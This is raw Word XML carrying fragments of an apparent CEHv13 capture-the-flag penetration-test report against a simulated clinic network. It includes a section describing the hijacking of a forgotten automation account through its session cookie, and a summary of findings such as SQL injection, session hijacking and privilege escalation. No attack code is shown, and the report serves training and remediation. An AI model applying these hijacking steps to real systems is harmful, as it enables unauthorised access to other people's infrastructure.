          <w:color w:val="404040"/>
          <w:spacing w:val="2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ele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e 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he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PSESS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ID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okie.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="21" w:line="258" w:lineRule="auto"/>
        <w:ind w:left="1800" w:right="588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c.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="37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si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 to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en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ure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cc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is re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v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k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.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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="20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 t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e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br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ow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er.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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e.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="25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hut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own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ll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v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l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hin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V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w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e.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="220" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1800"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:sectPr w:rsidR="00CF78E9">
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="700" w:right="0" w:bottom="280" w:left="0" w:header="0" w:footer="696" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pP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~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ne ~</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="15"/>
          <w:szCs w:val="15"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="17"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>o Just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40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t xml:space="preserve"> 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40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>W</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>ho</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t xml:space="preserve"> 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40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>he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40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>H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40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>ck is</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>M</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-3"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>a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40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>nn</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>i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40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>??</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="6" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440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Way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to go,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u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p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er ha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ker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--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y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ou didn’t ju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t p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w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n a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us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er. You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hija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ked Man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ie, the automation</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="28"/>
        <w:ind w:left="1440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ou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t run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ing half the infra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tru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u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re.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="4" w:line="220" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pP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Short</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>A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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>n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swer:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="2" w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="11"/>
          <w:szCs w:val="11"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440" w:right="1315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Man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ie is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’t a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p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er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4"/>
          <w:szCs w:val="24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n —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he’s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a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:i/>
          <w:color w:val="404040"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>legend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. O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u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r be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t gue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is that Moo, in a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="3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lat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-night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affein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- fueled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sp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rint,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p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un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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>u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p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an internal auto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m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at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on ac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ou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t m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ant to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run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nightly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jo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b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... and then forgot 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b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out hi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m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. Sin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then, Man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ie’s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been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q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uietly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p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lo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y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ing,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y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ncin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g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,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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>l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oggin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g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, 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m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ailin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g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, and ge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erally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ru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ning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the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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>h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ow —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w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ithout an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y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one noti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ing.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="17" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440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Hija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king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Man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ie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m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ea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4"/>
          <w:szCs w:val="24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y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ou didn’t ju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t get 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—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 xml:space="preserve"> y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ou be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m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 the gho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t in the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m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hine. And</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="1"/>
        <w:ind w:left="1440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now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that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 xml:space="preserve"> y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ou have Ma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nie’s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ookie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in hand, the infrastructure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thin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k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s </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:i/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:i/>
          <w:color w:val="404040"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">ou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are the infrastruc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ure.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="280" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="007E35E5">
      <w:pPr>
        <w:ind w:left="1440"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:sectPr w:rsidR="00CF78E9">
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="700" w:right="0" w:bottom="280" w:left="0" w:header="0" w:footer="696" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:pict>
          <v:group id="_x0000_s1069" style="position:absolute;left:0;text-align:left;margin-left:121.5pt;margin-top:62.75pt;width:358.85pt;height:290.95pt;z-index:-1881;mso-position-horizontal-relative:page" coordorigin="2430,1255" coordsize="7177,5819">
            <v:shape id="_x0000_s1076" type="#_x0000_t75" style="position:absolute;left:2430;top:1255;width:7177;height:5819">
              <v:imagedata r:id="rId39" o:title=""/>
            </v:shape>
            <v:shape id="_x0000_s1075" style="position:absolute;left:2841;top:1589;width:6431;height:3689" coordorigin="2841,1589" coordsize="6431,3689" path="m2841,1746r,3377l2857,5189r40,51l2954,5271r45,7l9118,5278r65,-16l9234,5222r32,-57l9272,5120r,-3377l9256,1678r-39,-52l9159,1595r-45,-6l2996,1589r-66,15l2879,1644r-31,57l2841,1746xe" fillcolor="black" stroked="f">
              <v:path arrowok="t"/>
            </v:shape>
            <v:shape id="_x0000_s1074" style="position:absolute;left:2841;top:1589;width:6431;height:3689" coordorigin="2841,1589" coordsize="6431,3689" path="m2841,1746r15,-65l2894,1628r57,-32l2999,1589r6115,l9180,1603r52,38l9265,1698r7,48l9272,5120r-14,65l9219,5238r-56,32l9114,5278r-6115,l2934,5263r-53,-38l2849,5168r-8,-48l2841,1746xe" filled="f" strokecolor="#af761f" strokeweight="1pt">
              <v:path arrowok="t"/>
            </v:shape>
            <v:shape id="_x0000_s1073" type="#_x0000_t75" style="position:absolute;left:3356;top:1589;width:5382;height:3689">
              <v:imagedata r:id="rId40" o:title=""/>
            </v:shape>
            <v:shape id="_x0000_s1072" style="position:absolute;left:6121;top:2999;width:123;height:0" coordorigin="6121,2999" coordsize="123,0" path="m6121,2999r123,e" filled="f" strokecolor="#faebac" strokeweight="1.44111mm">
              <v:path arrowok="t"/>
            </v:shape>
            <v:shape id="_x0000_s1071" style="position:absolute;left:5900;top:2999;width:95;height:0" coordorigin="5900,2999" coordsize="95,0" path="m5900,2999r95,e" filled="f" strokecolor="#7d8581" strokeweight="1.2069mm">
              <v:path arrowok="t"/>
            </v:shape>
            <v:shape id="_x0000_s1070" type="#_x0000_t75" style="position:absolute;left:5947;top:2957;width:184;height:176">
              <v:imagedata r:id="rId41" o:title=""/>
            </v:shape>
            <w10:wrap anchorx="page"/>
          </v:group>
        </w:pict>
      </w:r>
      <w:r w:rsidR="00A76861"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Ha</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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n</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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dle </w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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w</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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ith </w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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are. Even Moo’s</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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 xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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not to</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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t</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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ally</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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 xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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 w:rsidR="00A76861"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ure</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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 xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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how</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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 xml:space="preserve"> m</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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uch Mannie doe</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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 w:rsidR="00A76861"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.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="5" w:line="220" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="30"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pP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E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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>x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ec</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>u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t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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>i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ve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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 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S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>u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m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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-3"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>a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ry</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="3" w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="11"/>
          <w:szCs w:val="11"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="264" w:lineRule="auto"/>
        <w:ind w:left="1080" w:right="1054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his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 xml:space="preserve"> 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i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m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ulated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p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etra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ion te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t engag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em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t w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4"/>
          <w:szCs w:val="24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ondu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ted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 xml:space="preserve"> p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art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of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4"/>
          <w:szCs w:val="24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he CEHv13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final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hall</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="4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4"/>
          <w:szCs w:val="24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ge lab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to evaluate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he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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>u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ri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y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p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ture of an inter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al health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are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p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rodu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ti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4"/>
          <w:szCs w:val="24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n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nviro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nm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t.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he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p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r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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>i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m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ary o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b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je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tives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included ide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4"/>
          <w:szCs w:val="24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tif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y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ing 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d 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xp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loi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ing v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u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ln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ra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b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ili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ies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related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o i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4"/>
          <w:szCs w:val="24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p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ut valid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tion, file handlin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g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, authenti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at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on, lateral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m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ove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m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t, privilege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sc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ala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ion, and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ion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m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4"/>
          <w:szCs w:val="24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nag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em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t.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="10"/>
          <w:szCs w:val="10"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="264" w:lineRule="auto"/>
        <w:ind w:left="1080" w:right="1378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Seven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distinct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flags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 xml:space="preserve"> w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4"/>
          <w:szCs w:val="24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 identified, ea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h re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p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re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ting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a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uc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ful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x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p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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>l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oi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at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on or di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overy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of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a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ri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i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al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uri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4"/>
          <w:szCs w:val="24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y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fla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w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.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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>h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 ran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g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ed from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SQL in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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>j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tion 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d w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ak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p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as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w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ord hashing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to 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ess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ion hija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king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and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p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er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iste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3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3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.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he v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u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ln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ra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b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ili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4"/>
          <w:szCs w:val="24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ies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reflect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 xml:space="preserve"> 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mm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on r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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>l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-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w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orld is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u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often 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xp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loi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ed by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threat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to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4"/>
          <w:szCs w:val="24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in inter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al enviro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nm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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>en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ts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w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ith in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uffi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ient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ontrol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.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="19" w:line="280" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="264" w:lineRule="auto"/>
        <w:ind w:left="1080" w:right="1054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he re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p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ort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etails each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finding, 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ia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ed ri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k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, C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V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SS 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verity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ore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, and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lear re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m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edia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ion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te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ps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.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he find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g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mp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ha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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>i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z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the need for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ure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od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4"/>
          <w:szCs w:val="24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ng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 xml:space="preserve"> p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ra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ti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, la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y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ered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et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w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ork defe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ns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,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i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4"/>
          <w:szCs w:val="24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n hardenin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g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, and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p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roa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tive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m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onitoring. Or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g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ani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z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at</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="3"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24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ons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de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p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lo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y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ing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i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m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ilar</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="3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y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te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m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 xml:space="preserve"> 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4"/>
          <w:szCs w:val="24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uld treat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these findings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as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re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p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r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ta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ive of broader enter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p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ri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 ri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k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.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pP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Engag</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>e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me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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>n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 xml:space="preserve">t: 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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>In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ternal N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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>e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twork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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 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P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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>en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etra</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>t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i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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>o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n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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 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Test</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="3" w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="11"/>
          <w:szCs w:val="11"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080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Client: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XRAY Clinic Solu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4"/>
          <w:szCs w:val="24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ions</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="6020"/>
        </w:tabs>
